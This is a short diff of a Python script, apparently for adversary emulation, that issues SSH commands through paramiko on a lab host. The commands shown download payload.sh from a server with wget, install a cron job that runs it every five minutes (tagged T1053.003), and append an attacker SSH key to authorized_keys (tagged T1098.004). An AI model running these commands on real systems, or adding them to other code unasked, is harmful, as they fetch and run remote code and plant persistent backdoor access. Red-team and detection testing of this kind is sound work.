@@ -36,9 +36,8 @@ def run():
 	time.sleep(1)
 	paramiko_A('wget -O /root/payload.sh http://172.30.0.10:8000/payload.sh')
 	time.sleep(1)
-	paramiko_A('*/5 * * * * /root/payload.sh')
+	paramiko_A('echo "*/5 * * * * /root/payload.sh" | crontab -') # edited to perform T1053.003
 	time.sleep(1)
-	paramiko_A("""ssh -o StrictHostKeyChecking=no -p 2222 root@172.30.0.20 "echo \"'cat ~/.ssh/id_rsa.pub'\" >> .ssh/authorized_keys" """)
+	paramiko_A('echo "ssh-rsa FAKE attacker" >> ~/.ssh/authorized_keys') # edited to perform T1098.004
 	time.sleep(1)
 	paramiko_A('exit')
-run()
